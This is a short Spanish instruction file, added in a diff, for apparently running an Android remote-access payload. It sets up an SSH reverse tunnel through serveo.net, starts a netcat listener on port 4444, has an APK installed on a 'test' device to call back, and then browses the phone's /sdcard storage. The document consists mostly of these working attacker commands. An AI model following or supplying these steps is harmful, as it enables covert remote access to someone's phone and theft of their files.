@@ -1,0 +1,9 @@
+Paso 1 habre tu conexión de serveo en tu distribución linux 
+ssh -R 34805:localhost:4444 serveo.net
+
+Paso 2 en en otra terminal ponte en escucha con ncat utilizando el puerto 4444
+nc -nlvp 4444
+
+paso 3 instala la apk en el dispositivo de prueba habre la apk y espera la conexion remota 
+
+ya lista la conexión dirigete a la ruta del disposivo cd /sdcard y listo 
